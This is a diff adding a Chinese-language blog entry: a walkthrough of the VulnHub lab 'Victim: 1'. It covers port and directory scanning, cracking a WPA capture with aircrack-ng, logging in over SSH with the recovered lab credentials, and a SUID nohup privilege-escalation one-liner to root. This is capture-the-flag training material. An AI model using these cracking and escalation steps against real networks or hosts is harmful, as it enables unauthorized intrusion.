@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>Victim-1</title>
+      <link href="/article/Victim-1/"/>
+      <url>/article/Victim-1/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Victim: 1</h1><hr><p>easyNo.8</p><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/victim-1,469/">vulnhub靶场-Victim: 1</a></p><p>目标: Get the root flag.</p><p>提示: Enumeration is key and bruteforcing SSH will get you banned.</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.56.5</li><li>target: 192.168.56.20</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">9000/tcp open  cslistener</span><br></pre></td></tr></table></figure><p>可以访问的界面由80和9000, 进行目录扫描, 扫了一大堆也没几个有用的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.56.20 --exclude-status 403,301</span><br><span class="line">[02:44:43] 200 -    1KB - /htaccess.txt</span><br><span class="line">[02:44:44] 200 -    7KB - /LICENSE.txt</span><br><span class="line">[02:44:49] 200 -    2KB - /README.txt</span><br><span class="line">[02:44:50] 200 -  392B  - /robots.txt.dist</span><br><span class="line">[02:44:50] 200 -   33B  - /robots.txt</span><br><span class="line">[02:44:53] 200 -   31B  - /templates/index.html</span><br><span class="line"></span><br><span class="line">dirsearch -u http://192.168.56.20:9000 --exclude-status 403,404</span><br><span class="line">[03:13:24] 200 -    3KB - /.htaccess</span><br><span class="line">[03:14:26] 200 -    0B  - /index.php</span><br></pre></td></tr></table></figure><p>阅读<code>htaccess.txt</code>和<code>README.txt</code>, 得到这是一个Joomla CMS</p><p><code>/robots.txt.dist</code>里面的路由更是全军覆没, <code>/robots.txt</code>可以得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: h@ck3rz!</span><br></pre></td></tr></table></figure><p>这个看起来是给我们看的, 那肯定是哪里有问题, 我们漏了什么; 重新扫描端口, 果然, 漏了一个8999端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 0-65535 192.168.56.20</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">8999/tcp open  bctp</span><br><span class="line">9000/tcp open  cslistener</span><br></pre></td></tr></table></figure><p>访问8999端口, 发现是一个wordpress网站, 但是没有实际界面, 只能查看源码; 唯一只有<code>WPA-01.cap</code>比较可疑</p><p>该流量包协议为802.11(WLAN)</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250107170708.png" alt="image.png"></p><p>DLine代表的是D-Link公司生产的设备, 一搜就知道是WiFi/路由器; 5a:b6:62则是MAC地址的一部分</p><p>所以这个流量文件是路由器交互的包, 肯定能拿到连接到路由器的密码</p><p><a href="https://blog.csdn.net/achejq/article/details/7899006">aircrack-ng破解教程</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.<span class="built_in">cap</span>  </span><br><span class="line"><span class="comment"># 使用gzip -d rockyou.txt.gz进行解压</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250107172007.png" alt="image.png"></p><p>第一个数据包存在双方信息, 剩下的都是通讯信息; 我们现在获取的有效字符串只有刚才的密码, 肯定是不够的, 看看第一个数据包中还有什么</p><p>每个无线网络都有自己的 <strong>SSID</strong>, 意思是SSID是唯一的, 这个可能会用于用户名;</p><blockquote><p>注意直接爆破ssh会被封禁, 所以要尽可能地缩小范围</p></blockquote><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250107181813.png" alt="image.png"></p><p>现在, 可以能利用到的服务都使用过了, 尝试利用已有信息登录ssh</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dlink : p4ssword</span><br></pre></td></tr></table></figure><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh dlink@192.168.56.20</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250107182214.png" alt="image.png"></p><p>成功登录</p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux victim01 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 4.15.0-96-generic, 太高了</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">python -h</span><br><span class="line">nc -h</span><br><span class="line"><span class="comment"># 查看权限, 发现是TryHarder!</span></span><br><span class="line">sudo -l</span><br><span class="line"><span class="comment"># 查看特权文件, nohup</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><code>sudo -l</code>中首先那个文件不存在, 然后我们没有权限创建那个文件; 内核版本太高, payload不好找; 还是来看看有SUID权限的nohup提权吧</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p><a href="https://gtfobins.github.io/gtfobins/nohup/">nohup</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> /bin/sh -p -c <span class="string">&quot;sh -p &lt;<span class="subst">$(tty)</span> &gt;<span class="subst">$(tty)</span> 2&gt;<span class="subst">$(tty)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>成功提权并拿到在root下的flag</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250107183202.png" alt="image.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> vulnhub靶场 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 提权 </tag>
+            
+            <tag> 信息收集 </tag>
+            
+            <tag> nohup提权 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>EVM-1</title>
       <link href="/article/EVM-1/"/>
       <url>/article/EVM-1/</url>
